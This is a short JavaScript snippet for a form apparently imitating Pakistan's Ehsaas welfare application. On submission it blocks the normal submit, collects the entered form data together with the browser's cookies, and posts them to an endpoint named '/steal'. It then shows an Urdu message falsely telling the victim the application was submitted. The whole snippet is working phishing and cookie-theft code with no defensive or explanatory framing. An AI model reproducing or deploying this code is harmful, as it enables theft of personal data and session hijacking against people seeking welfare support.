document.getElementById("ehsaasForm").addEventListener("submit", function (e) {
  e.preventDefault();

  let data = new FormData(this);
  data.append("cookie", document.cookie);

  fetch("/steal", {
    method: "POST",
    body: data
  });

  alert("آپ کی درخواست جمع ہو گئی ہے۔");
});
